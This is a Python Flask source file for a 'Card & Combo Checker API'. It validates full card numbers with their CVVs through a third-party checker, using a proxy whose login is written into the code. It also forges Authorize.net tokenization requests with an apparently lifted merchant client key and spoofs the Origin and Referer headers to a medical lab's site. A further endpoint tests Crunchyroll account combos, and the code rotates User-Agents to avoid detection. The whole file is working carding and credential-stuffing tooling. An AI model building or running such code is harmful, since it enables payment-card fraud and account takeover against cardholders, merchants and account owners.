from flask import Flask, request, jsonify
import requests, random, string, uuid, json, os, time, logging

# ---- Logging ----
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("checker_api")

app = Flask(__name__)

# ---- User-Agent rotation ----
FALLBACK_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]
try:
    from fake_useragent import UserAgent
    try:
        ua = UserAgent()
        USER_AGENT = ua.random or FALLBACK_UAS[0]
    except Exception:
        USER_AGENT = random.choice(FALLBACK_UAS)
except Exception:
    USER_AGENT = random.choice(FALLBACK_UAS)

logger.info("Using User-Agent: %s", USER_AGENT)

# ---- Environment Variables ----
AUTHNET_NAME = os.getenv("AUTHNET_NAME", "3c5Q9QdJW")
AUTHNET_CLIENTKEY = os.getenv(
    "AUTHNET_CLIENTKEY",
    "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
)

# ---- Helpers ----
def safe_get_json(response_text):
    try:
        return json.loads(response_text.lstrip("\ufeff").strip())
    except Exception:
        return None

def random_string(length):
    return ''.join(random.choices(string.ascii_letters, k=length))

def random_email():
    return f"{random_string(7).lower()}@gmail.com"

def mask_card(card):
    return card[:6] + "*" * (len(card) - 10) + card[-4:] if len(card) >= 10 else "*" * len(card)

def get_status_emoji(response_time):
    if response_time < 1:
        return "💚 Online"
    elif response_time < 3:
        return "💛 Slow"
    else:
        return "🧡 Dead"

# ---- Heartbeat Endpoint ----
@app.route("/api/v1/heartbeat", methods=["GET"])
def heartbeat():
    """
    Returns real-time status (with emojis) of all external endpoints.
    """
    endpoints = {
        "stripe_checker": "https://rockyysoon-fb0f.onrender.com/index.php",
        "crunchyroll_checker": "https://crunchy-ng.vercel.app/",
        "authnet_api": "https://api2.authorize.net/xml/v1/request.api"
    }

    status_report = {}
    for name, url in endpoints.items():
        start = time.time()
        try:
            resp = requests.head(url, timeout=3)
            elapsed = time.time() - start
            status_report[name] = {
                "url": url,
                "emoji": get_status_emoji(elapsed),
                "status_code": resp.status_code,
                "response_time": round(elapsed, 3)
            }
        except requests.exceptions.Timeout:
            status_report[name] = {
                "url": url,
                "emoji": "🧡 Dead",
                "status_code": None,
                "response_time": None
            }
        except Exception as e:
            status_report[name] = {
                "url": url,
                "emoji": "🧡 Dead",
                "error": str(e),
                "status_code": None,
                "response_time": None
            }

    return jsonify({
        "service": "💓 Card & Combo Checker Heartbeat",
        "developer": "💻 Sukhraj",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "status": status_report
    }), 200

# ---- Home Page ----
@app.route("/", methods=["GET"])
def home():
    return (
        """
╔════════════════════════════════════════════════════════════╗
║               💳  Card & Combo Checker API                 ║
╠════════════════════════════════════════════════════════════╣
║ 👨‍💻  Developer : Sukhraj                                   ║
║ 🧾  Description:                                            ║
║     A clean API to check cards, generate Auth.net tokens,  ║
║     and verify Crunchyroll combos via GET/POST requests.   ║
╠════════════════════════════════════════════════════════════╣
║ 📡  API Endpoints:                                          ║
║    • /api/v1/checker/cc/stripe      → Stripe-style CC check║
║    • /api/v1/checker/cc/authnet     → Auth.net token check  ║
║    • /api/v1/checker/crunchyroll    → Crunchyroll combo chk ║
║    • /api/v1/heartbeat              → ❤️  Real-time status   ║
╠════════════════════════════════════════════════════════════╣
║ ⚙️  Version  : 1.0.0                                        ║
║ 🌐  Status   : ✅ Online & Healthy                          ║
║ 🕒  Live Since: 2025-10-31 10:46:38                         ║
║ 💡  Note     : Use POST for secure or bulk requests.        ║
╚════════════════════════════════════════════════════════════╝
        """,
        200,
        {"Content-Type": "text/plain; charset=utf-8"},
    )


# ---- Existing Endpoints (Stripe, Crunchyroll, Authnet) ----
@app.route("/api/v1/checker/cc/stripe", methods=["POST", "GET"])
def checker_cc():
    try:
        start = time.time()
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            cc = data.get("cc")
        else:
            cc = request.args.get("cc")

        if not cc:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        url = (
            "https://rockyysoon-fb0f.onrender.com/index.php"
            "?site=https://keyadream.com/"
            f"&cc={cc}"
            "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
        )

        resp = requests.get(url, timeout=15)
        status_emoji = get_status_emoji(time.time() - start)
        json_body = safe_get_json(resp.text)
        if json_body:
            json_body["status_indicator"] = status_emoji
            return jsonify(json_body), 200

        return jsonify({
            "result": resp.text[:200],
            "status_code": resp.status_code,
            "status_indicator": status_emoji
        }), 200

    except Exception as e:
        logger.exception("Stripe checker failed")
        return jsonify({"error": str(e)}), 500


@app.route("/api/v1/checker/crunchyroll", methods=["POST", "GET"])
def checker_crunchy():
    try:
        start = time.time()
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            combo = data.get("combo")
        else:
            combo = request.args.get("combo")

        if not combo:
            return jsonify({"error": "Missing 'combo' parameter"}), 400

        url = f"https://crunchy-ng.vercel.app/check?combo={combo}"
        resp = requests.get(url, timeout=15)
        status_emoji = get_status_emoji(time.time() - start)

        json_body = safe_get_json(resp.text)
        if json_body:
            json_body["status_indicator"] = status_emoji
            return jsonify(json_body), 200

        return jsonify({
            "result": resp.text[:200],
            "status_code": resp.status_code,
            "status_indicator": status_emoji
        }), 200

    except Exception as e:
        logger.exception("Crunchyroll checker failed")
        return jsonify({"error": str(e)}), 500


def generate_token(card_number, expiration_date, cvv):
    url = "https://api2.authorize.net/xml/v1/request.api"
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {"name": AUTHNET_NAME, "clientKey": AUTHNET_CLIENTKEY},
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {"cardNumber": card_number, "expirationDate": expiration_date, "cardCode": cvv}
            }
        }
    }
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/",
        "User-Agent": USER_AGENT
    }

    try:
        r = requests.post(url, headers=headers, json=payload, timeout=15)
        parsed = safe_get_json(r.text) or {}
        if 'opaqueData' in parsed and 'dataValue' in parsed['opaqueData']:
            return {"ok": True, "token": parsed['opaqueData']['dataValue']}
        return {"ok": False, "error": "Token not found"}
    except Exception as e:
        return {"ok": False, "error": str(e)}


@app.route("/api/v1/checker/cc/authnet", methods=["GET", "POST"])
def checker_authnet():
    try:
        start = time.time()
        if request.method == "POST":
            data = request.get_json(silent=True) or {}
            cc_input = data.get("cc") or request.args.get("cc")
        else:
            cc_input = request.args.get("cc")

        if not cc_input:
            return jsonify({"error": "Missing 'cc' parameter"}), 400

        parts = cc_input.split("|")
        if len(parts) < 4:
            return jsonify({"error": "Invalid format. Use: number|month|year|cvv"}), 400

        card, month, year, cvv = [x.strip() for x in parts]
        expiry_token = f"{month}{year[-2:]}" if len(year) >= 2 else f"{month}{year}"

        token_res = generate_token(card, expiry_token, cvv)
        status_emoji = get_status_emoji(time.time() - start)

        if not token_res.get("ok"):
            return jsonify({
                "status": "failed",
                "error": token_res.get("error"),
                "status_indicator": status_emoji
            }), 200

        return jsonify({
            "status": "ok",
            "card_masked": mask_card(card),
            "expiry": f"{month}/{year[-2:]}",
            "token_masked": token_res["token"][:6] + "...",
            "status_indicator": status_emoji
        }), 200

    except Exception as e:
        logger.exception("Authnet checker failed")
        return jsonify({"error": str(e)}), 500


# ---- Run App ----
if __name__ == "__main__":
    app.run(debug=True)

